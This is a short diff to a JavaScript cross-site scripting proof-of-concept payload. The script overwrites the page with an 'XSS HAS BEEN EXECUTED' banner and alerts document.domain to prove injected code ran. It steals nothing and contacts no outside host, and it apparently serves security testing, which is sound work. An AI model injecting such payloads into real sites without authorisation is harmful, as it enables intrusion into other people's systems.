@@ -2,7 +2,7 @@
 document.documentElement.innerHTML = `
   <html>
   <head>
-    <title>Replaced Content</title>
+    <title>XSS</title>
     <style>
       #banner {
         position: fixed;
@@ -18,13 +18,13 @@ document.documentElement.innerHTML = `
     </style>
   </head>
   <body>
-    <div id="banner">TEST</div>
+    <div id="banner">XSS HAS BEEN EXECUTED</div>
   </body>
   </html>
 `;
 
 // Run an alert with document.domain
-alert('Current document.domain: ' + document.domain);
+alert(document.domain);
 
 // Display the moving banner
 const banner = document.getElementById('banner');
